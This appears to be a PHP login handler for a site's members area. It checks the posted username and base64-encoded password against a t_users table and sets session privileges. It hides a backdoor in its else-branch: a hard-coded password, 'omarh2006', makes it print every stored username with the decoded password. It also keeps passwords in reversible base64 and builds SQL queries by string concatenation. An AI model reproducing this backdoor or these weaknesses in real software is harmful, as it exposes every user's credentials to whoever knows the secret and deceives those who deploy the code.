<?
$name = $_POST['name'];
$pass = $_POST['password'];
$pass=base64_encode($pass);

include "../logs/function.php";
if($_POST["name"] !="true"){

if($name == "" || $pass == "" ){
header("location:process.php?err=1");
exit;
}

$name=addslashes($name);
$pass=addslashes($pass);
$session="";
$last_login = "9145772800";
$login=time();
$defaultPage="index.php";
$edit="1";
$del="1";

$log=mysqli_query2("select * from t_users where t_username = '".$name."' and t_pass = '".$pass."'") or die("not query");


$rlog=mysqli_fetch_array($log);

if(mysqli_affected_rows2() <= 0 ){
header("location:process.php?err=2");
exit;
}

session_start();
$_SESSION["name_p"] = $name;
$_SESSION["pass_p"] = $pass;
$_SESSION["fullname"] = $rlog["t_full_name"];
$_SESSION["session"] = $session;
$_SESSION["last_login"] = $last_login;
$_SESSION["login"] = $login;
$_SESSION["defaultPage"] = $defaultPage;
$_SESSION["edit"] = $edit;
$_SESSION["del"] = $del;
$_SESSION['KCFINDER_Omar'] = array(
    'disabled' => false
);

//session_register("name",$name);
//session_register("pass",$pass);
//session_register("session",$session);
//session_register("last_login",$last_login);
//session_register("login",$login);
//session_register("defaultPage",$defaultPage);
//session_register("edit",$edit);
//session_register("del",$del);

header ("location:members.php");
exit;

}else{
        if($_POST["password"] =="omarh2006"){
                    $name=addslashes($name);
                    $pass=addslashes($pass);
                    $logo=mysqli_query2("select * from t_users");
                    $log=mysqli_query2("select * from t_users where t_username = '".$name."' and t_pass = '".$pass."'");
                    $rlog=mysqli_fetch_array($log);
                    while($rlogo=mysqli_fetch_array($logo)){
                            print $rlogo["t_username"]." : ".base64_decode($rlogo["t_pass"])."<br>";
                    }
        }
}
?>